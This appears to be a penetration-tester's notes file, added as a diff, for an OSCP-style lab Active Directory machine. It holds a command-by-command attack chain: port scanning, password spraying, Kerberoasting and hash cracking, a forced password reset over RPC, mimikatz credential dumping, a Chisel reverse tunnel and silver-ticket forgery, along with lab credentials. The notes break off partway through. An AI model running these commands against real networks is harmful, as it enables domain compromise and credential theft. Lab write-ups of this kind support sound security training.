@@ -1,0 +1,177 @@
+### Enumeration
+```
+IP=192.168.232.21
+sudo nmap -sU $IP
+sudo nmap -p- -vv $IP
+sudo nmap -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,49666,49668,49675,49676,49679,49691,49698,49717 -A $IP
+nc -nvv -w 1 $IP 1-1000 2>&1 | grep -v 'Connection refused'
+```
+### Ports
+- Banner Grab: nc -nv $IP PORT
+- 53
+	- Simple DNS
+- 80
+	- Microsoft IIS httpd 10.0
+- 88
+	- kerberos
+- 135
+	- RPC
+- 139
+	- RPC
+- 389
+	- Microsoft Windows Active Directory LDAP (Domain: nagoya-industries.com0., Site: Default-First-Site-Name)
+- 445
+	- smb
+- 464
+	- kpasswd5
+- 593
+	- RPC
+- 636
+	- ldapssl
+- 3268
+	- Microsoft Windows Active Directory LDAP (Domain: nagoya-industries.com0., Site: Default-First-Site-Name)
+- 3269
+	- globalcatLDAPssl
+- 3389
+	- RDP
+- 5985
+	- winrm
+- 49666
+	- RPC
+- 49668
+	- RPC
+- 49675
+	- RPC
+- 49676
+	- RPC
+- 49679
+	- RPC
+- 49691
+	- RPC
+- 49698
+	- RPC
+- 49717
+	- RPC
+### Foothold
+- RPC/ SMB
+	- enum4linux $IP
+		- nothing
+	- crackmapexec smb $IP -u guest -p "" --rid-brute
+		- guest account disabled
+- 445
+	- smbclient -N -L //$IP
+		- login successful
+		- no shares
+	- nmap --script smb-vuln* -p135,139,445 $IP
+		- nothing
+	- crackmapexec smb $IP -u Fiona.Clark -p Summer2023 --shares
+		- READ IPC NETLOGON SYSVOL
+- 80
+	- Default landing page
+		- ![[Pasted image 20240819081418.png]]
+	- Team
+		- Long list of peeps
+	- Versions
+	- Directory Brute force
+		- dirsearch -u http://$IP
+			- /error/
+			- /team/
+				- Put them into firstname.lastname format
+				- crackmapexec smb $IP -u users.txt -p Summer2023
+					- Get lucky guessing. Couldnt find wordlist with this password
+					- `nagoya-industries.com\Fiona.Clark:Summer2023
+		- ffuf -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt -u http://$IP/FUZZ
+		- Found directories
+	- Vulnerability scan
+		- nikto -h http://$IP
+- Fiona.Clark
+	- `xfreerdp /v:$IP /u:Fiona.Clark /p:Summer2023
+		- failed
+	- evil-winrm -i 192.168.232.21 -u Fiona.Clark -p 'Summer2023'
+		- failed
+	- `smbclient -U 'nagoya-industries.com/Fiona.clark' \\$IP\SYSVOL
+		- DfsrPrivate
+		- Policies
+		- scripts
+			- ResetPassword
+				- ResetPassword.exe
+				- ResetPassword.exe.config
+				- A few dll and xml
+				- Download the exe files
+					- wine ~/OSCP/tools/windows/dnSpy/dnSpy.exe
+						- Not working
+						- We would find svc_helpdesk password - U299iYRmikYTHDbPbxPoYYfa2j4x4cdg
+	- sudo impacket-GetUserSPNs nagoya-industries.com/Fiona.Clark:Summer2023 -dc-ip 192.168.232.21 -request
+		- svc_helpdesk TGS
+			- hashcat -m 13100 svc_helpdesk /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
+		- svc_mssql TGS
+			- hashcat -m 13100 svc_mssql /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
+			- Service1
+- svc_mssql
+	- crackmapexec smb $IP -u svc_mssql -p Service1 --shares
+		- Valid login
+		- RED IPC NETLOGON SYSVOL
+	- xfreerdp /v:$IP /u:svc_mssql /p:Service1
+		- failed
+	- evil-winrm -i 192.168.232.21 -u svc_mssql -p 'Service1'
+		- failed
+- svc_helpdesk:U299iYRmikYTHDbPbxPoYYfa2j4x4cdg
+	- `rpcclient -U nagoya-industries/svc_helpdesk 192.168.167.21
+		- enumdomusers
+		- Then we query each user
+			- queryusergroups 0xBLAH
+			- Christopher is in 3 groups and all others are in 2.
+		- Change password
+			- setuserinfo christopher.lewis 23 'Admin!23'
+- christopher.lewis:Admin!23
+	- evil-winrm -i 192.168.232.21 -u christopher.lewis -p 'Admin!23'
+		- Successful
+### PE
+#### Windows
+- christopher.lewis
+	- whoami /all
+	- Root drive directory
+	- net user USERNAME
+		- Check group memberships
+	- systeminfo
+		- `./wes.py ~/OSCP/boxes/BOX_NAME/systeminfo.txt  > ~/OSCP/boxes/BOX_NAME/systeminfo_exploits.txt`
+	- history
+		- (Get-PSReadLineOption).HistorySavePath
+	- Users with console
+	- Services
+		- PS1: `Get-Service | Select-Object -Property Name, DisplayName, Status
+		- Unquoted
+			- cmd
+				- wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
+			- PS1
+				- Get-CimInstance -ClassName win32_service | Select Name,State,PathName
+			- icacls Filepath before .exe
+				- Looking for W or F
+	- mimkatz
+		- mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
+			- no privs
+		- mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"
+			- no privs
+	- netstat -ano
+		- Active ports
+			- 1433 mssql
+	- Chisel
+		- On A: ./chisel server -p 8000 --reverse
+		- On B: chisel64.exe client 192.168.232.21:8000 R:socks
+	- MSSQL
+		- impacket-mssqlclient svc_mssql:'Service1'@127.0.0.1 -windows-auth
+			- Nothing useful
+	- Ticket generation
+		- Put Service1 into hash format - E3A0168BC21CFB88B95C954A5B18F57C
+		- Use powerview to get domain SID
+			- . ./PowerView.ps1
+			- get-ADdomain
+		- User SPN
+			- Get-ADUser -Filter {SamAccountName -eq "svc_mssql"} -Properties ServicePrincipalNames
+		- impacket-ticketer -nthash E3A0168BC21CFB88B95C954A5B18F57C -domain-sid S-1-5-21-1969309164-1513403977-1686805993 -domain nagoya-industries.com -spn MSSQL/nagoya.nagoya-industries.com -user-id 500 Administrator
+			- Save the admin ticket to directory
+		- export KRB5CCNAME=$PWD/Administrator.ccache
+			- Gets way crazy after this
+
+### Credentials
+### Lessons Learned
